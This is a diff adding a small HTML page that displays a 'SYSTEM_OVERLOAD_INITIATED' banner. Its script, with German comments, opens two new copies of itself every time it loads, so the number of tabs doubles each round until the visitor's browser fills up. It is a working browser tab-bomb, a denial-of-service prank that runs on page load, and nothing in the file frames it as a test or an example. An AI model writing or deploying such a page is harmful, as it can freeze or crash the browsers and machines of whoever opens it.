@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>LOADING...</title>
+</head>
+<body style="background: black; color: #0f0; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh;">
+    <h1>SYSTEM_OVERLOAD_INITIATED...</h1>
+    <script>
+        // Versucht sofort, zwei neue Instanzen von sich selbst zu öffnen
+        // Das erzeugt ein exponentielles Wachstum (1 -> 2 -> 4 -> 8...)
+        setTimeout(() => {
+            window.open('tab.html', '_blank');
+            window.open('tab.html', '_blank');
+        }, 100);
+    </script>
+</body>
+</html>
